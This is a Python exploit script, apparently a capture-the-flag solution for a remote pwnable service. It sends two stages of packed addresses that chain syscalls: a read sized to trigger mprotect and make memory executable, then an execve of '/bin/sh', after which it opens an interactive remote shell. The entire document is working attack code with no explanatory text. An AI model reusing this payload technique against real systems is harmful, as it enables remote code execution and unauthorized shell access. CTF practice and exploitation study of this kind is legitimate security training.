#!/usr/bin/env python
import sc_pwn
from struct import *
from time import sleep

rhp     = ("pwnable.katsudon.org",28099)
sh      = "/bin/sh"

addr_syscall    = 0x08048080
addr_read       = 0x080480a9
addr_exit       = 0x080480df

elf_head       = 0x08048000

sys_execve      = 0x0b
sys_mprotect    = 0x7d
length          = 0x1000
null            = 0x0

#==========

def attack(nc):
    exploit_st1 =   "\x00"*0x10
    exploit_st1 +=  pack("<I", addr_syscall)
    exploit_st1 +=  pack("<I", addr_read-0x2)
    exploit_st1 +=  pack("<I", elf_head)
    exploit_st1 +=  pack("<I", length)
    exploit_st1 +=  pack("<I", 0x7)
    exploit_st1 +=  "\x00"*(sys_mprotect-len(exploit_st1))

    exploit_st2 =   "\x00"*0x10
    exploit_st2 +=  pack("<I", addr_syscall)    #$ecx=addr_stack
    exploit_st2 +=  pack("<I", addr_read)
    exploit_st2 +=  pack("<I", null)
    exploit_st2 +=  pack("<I", elf_head)
    exploit_st2 +=  pack("<I", null)
    exploit_st2 +=  pack("<I", null)
    exploit_st2 +=  pack("<I", addr_syscall)
    exploit_st2 +=  pack("<I", addr_exit)
    exploit_st2 +=  pack("<I", elf_head)
    exploit_st2 +=  pack("<I", null)
    exploit_st2 +=  pack("<I", null)

    #open('exploit_st1','wb').write(exploit_st1)
    #open('exploit_st2','wb').write(exploit_st2)
    #open('shstr','wb').write(sh+"\x00"*(sys_execve-len(sh)))

    nc.read_all()
    nc.send(exploit_st1)
    sleep(1)
    nc.send(exploit_st2)
    sleep(1)
    nc.send(sh+"\x00"*(sys_execve-len(sh)))

#==========
    
if __name__=='__main__':
    nc = sc_pwn.Communicate(rhp)
    attack(nc)

    sh = sc_pwn.Shell(nc)
    sh.select()

    del(sh)
    del(nc)

#==========
